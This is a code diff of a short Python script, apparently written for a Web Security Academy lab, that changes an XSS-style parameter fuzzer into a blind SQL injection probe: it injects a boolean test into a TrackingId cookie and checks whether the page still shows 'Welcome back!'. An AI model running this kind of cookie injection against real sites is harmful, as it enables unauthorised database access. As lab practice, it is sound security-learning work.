@@ -1,29 +1,41 @@
 import requests
 import threading
+import re
 
 def getPayload():
 	payloads = []
-	with open("./payload.txt", "r") as f:
+	with open("./asciiChars.txt", "r") as f:
 		payloads = f.read().split('\n')
 
 	return payloads
 
 def sendGetRequest(domain, payload):
-	parameters = {'search': '<' + payload + '>'}
+	parameters = {}
 	headers = {}
-	cookies = {}
+	cookies = { 'TrackingId':'PMIIyAp7oToqqkd1\'+AND+\'1\'=\'2',
+				'session':'J2O16Q54nWSn1T3z9ep0mxe68lsJKXqY'}
 
-	r = requests.get(domain, params=parameters, headers=headers, cookies=cookies)
+	r = requests.get(domain, cookies=cookies)
 	return r
 
 payloads = getPayload()
-domain = 'https://ac091fe61f7388628064ac9700900030.web-security-academy.net/'
+domain = 'https://ac001f8b1f19565980084f0d006b00e5.web-security-academy.net/'
 
 def sendIt(payload):
 	response = sendGetRequest(domain, payload)
-	if response.status_code == 200:
-		print(payload, response.status_code)
+	print(response.status_code)
+	match = response.text
+	print('===============================================================')
+	if match.find('Welcome back!') == -1:
+		print("didnt find it")
+	else:
+		print('found it')
 
+#for payload in payloads:
+#	print(payload)
+sendIt(payloads[0])
+
+'''
 threads = []
 
 for payload in payloads:
@@ -37,3 +49,4 @@ for t in threads:
 	t.join()
 
 print('Success')
+'''
